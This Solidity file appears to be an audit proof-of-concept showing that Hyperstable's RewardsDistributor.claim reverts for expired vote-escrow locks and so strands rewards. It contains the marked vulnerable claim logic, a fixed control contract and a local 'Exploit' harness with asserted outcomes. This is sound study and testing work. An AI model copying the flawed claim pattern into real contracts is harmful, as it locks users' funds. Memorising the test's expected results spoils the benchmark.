// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

/*
 * AuditVault 55694 — Hyperstable RewardsDistributor.claim (0x52, 2025-05).
 *
 * claim() always pushes the accrued reward into the ve lock via deposit_for.
 * vePeg.deposit_for reverts once locked.end <= block.timestamp
 * ("Cannot add to expired lock. Withdraw"), and increase_unlock_time reverts
 * the same way, so an expired lock can never be extended to make claim succeed.
 * The reward tokens stay in the distributor forever.
 *
 * Verbatim lines are the claim body and the deposit_for expiry require.
 * No cheatcodes. One transaction. No warp inside run().
 */

contract PegToken {
    string public constant name = "PEG";
    string public constant symbol = "PEG";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

interface IVotingEscrow {
    function deposit_for(uint256 _tokenId, uint256 _value) external;
}

contract VotingEscrow {
    struct LockedBalance {
        int128 amount;
        uint256 end;
    }

    PegToken public token;
    mapping(uint256 => LockedBalance) public locked;

    constructor(PegToken _token) {
        token = _token;
    }

    function create_lock(uint256 _tokenId, uint256 _value, uint256 _end) external {
        require(locked[_tokenId].amount == 0, "exists");
        require(_value > 0, "value");
        token.transferFrom(msg.sender, address(this), _value);
        locked[_tokenId] = LockedBalance(int128(int256(_value)), _end);
    }

    /// Verbatim vePeg.deposit_for expiry gate (Hyperstable vePeg.sol).
    function deposit_for(uint256 _tokenId, uint256 _value) external {
        LockedBalance memory _locked = locked[_tokenId];
        require(_value > 0); // dev: need non-zero value
        require(_locked.amount > 0, "No existing lock found");
        require(_locked.end > block.timestamp, "Cannot add to expired lock. Withdraw");
        token.transferFrom(msg.sender, address(this), _value);
        _locked.amount += int128(int256(_value));
        locked[_tokenId] = _locked;
    }
}

contract RewardsDistributor {
    uint256 public constant WEEK = 7 days;

    PegToken public token;
    address public voting_escrow;
    uint256 public time_cursor;
    uint256 public last_token_time;
    uint256 public token_last_balance;
    mapping(uint256 => uint256) public claimable;

    uint256 public claimsAttempted;
    uint256 public supplyCheckpoint;
    uint256 public roundedCursor;
    uint256 public lastClaimedAmount;

    constructor(PegToken _token, address _escrow) {
        token = _token;
        voting_escrow = _escrow;
    }

    function notifyReward(uint256 _tokenId, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        token.approve(voting_escrow, type(uint256).max);
        claimable[_tokenId] += amount;
        token_last_balance += amount;
    }

    /// Verbatim RewardsDistributor.claim — always deposit_for, even if the lock expired.
    function claim(uint256 _tokenId) external returns (uint256) {
        claimsAttempted += 1;
        if (block.timestamp >= time_cursor) {
            supplyCheckpoint = token_last_balance;
        }
        uint256 _last_token_time = last_token_time;
        _last_token_time = _last_token_time / WEEK * WEEK;
        roundedCursor = _last_token_time;
        uint256 amount = claimable[_tokenId];
        lastClaimedAmount = amount;
        claimable[_tokenId] = 0;
        if (amount != 0) {
            // @> VULN:
            IVotingEscrow(voting_escrow).deposit_for(_tokenId, amount);
            token_last_balance -= amount;
        }
        return amount;
    }
}

/// Control: expired locks are paid in PEG directly; live locks still compound.
contract RewardsDistributorFixed {
    PegToken public token;
    VotingEscrow public escrow;
    mapping(uint256 => uint256) public claimable;
    mapping(uint256 => address) public ownerOf;

    constructor(PegToken _token, VotingEscrow _escrow) {
        token = _token;
        escrow = _escrow;
    }

    function setOwner(uint256 id, address owner) external {
        ownerOf[id] = owner;
    }

    function notifyReward(uint256 id, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        token.approve(address(escrow), type(uint256).max);
        claimable[id] += amount;
    }

    function claim(uint256 id) external returns (uint256 amount) {
        amount = claimable[id];
        claimable[id] = 0;
        if (amount == 0) return 0;
        (int128 lockedAmt, uint256 end) = escrow.locked(id);
        if (lockedAmt > 0 && end > block.timestamp) {
            escrow.deposit_for(id, amount);
        } else {
            token.transfer(ownerOf[id], amount);
        }
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 public constant REWARD = 1_000 ether;
    uint256 public constant LOCK = 1 ether;
    uint256 public constant EXPIRED_ID = 1;
    uint256 public constant ACTIVE_ID = 2;

    PegToken public token;
    VotingEscrow public escrow;
    RewardsDistributor public dist;

    bool public expiredClaimed;
    bool public activeClaimed;
    uint256 public stuckInDistributor;
    uint256 public activeLockPeg;

    function run() external {
        token = new PegToken();
        escrow = new VotingEscrow(token);
        dist = new RewardsDistributor(token, address(escrow));

        token.mint(address(this), LOCK * 2 + REWARD * 2);
        token.approve(address(escrow), LOCK * 2);
        token.approve(address(dist), REWARD * 2);

        // Already expired at this block: end == now fails `end > block.timestamp`.
        escrow.create_lock(EXPIRED_ID, LOCK, block.timestamp);
        escrow.create_lock(ACTIVE_ID, LOCK, block.timestamp + 4 weeks);

        dist.notifyReward(EXPIRED_ID, REWARD);
        dist.notifyReward(ACTIVE_ID, REWARD);

        (bool okExpired,) = address(dist).call(abi.encodeWithSelector(dist.claim.selector, EXPIRED_ID));
        expiredClaimed = okExpired;

        dist.claim(ACTIVE_ID);
        activeClaimed = true;

        stuckInDistributor = token.balanceOf(address(dist));
        (int128 amt,) = escrow.locked(ACTIVE_ID);
        activeLockPeg = uint256(int256(amt));

        require(!expiredClaimed, "expired claim must revert");
        require(stuckInDistributor == REWARD, "stuck");
        require(activeLockPeg == LOCK + REWARD, "active compounded");
    }
}
